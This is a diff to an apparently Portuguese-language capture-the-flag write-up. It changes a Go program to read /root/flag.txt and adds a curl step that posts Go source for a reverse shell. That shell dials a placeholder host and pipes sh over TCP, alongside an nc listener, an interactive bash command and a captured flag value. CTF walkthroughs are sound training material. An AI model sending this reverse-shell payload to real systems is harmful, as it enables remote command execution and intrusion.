@@ -33,7 +33,7 @@ import (
 
 func main() {
 	// Comando para executar o script shell
-	cmd := exec.Command("cat", "flag.txt")
+	cmd := exec.Command("cat", "/root/flag.txt")
 
 	// Executa o comando e captura a saÃ­da
 	output, err := cmd.CombinedOutput()
@@ -66,6 +66,21 @@ nc -l 127.0.0.1 4444
 ```
 curl
 ```sh
-
+curl -X POST -v \
+  -d 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","seu_host_aqui_com_a_porta");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' \
 ```
 
+![alt text](images/connect.png)
+
+Após rodamos o seguinte comando:
+
+```sh
+/bin/bash -i 
+```
+
+Agora vá para pasta chamada public/flag_pwn.txt
+
+```sh
+cat ../public/flag_pwn.txt
+# Extreme{6630db853468e9c768a584981349e924}
+```
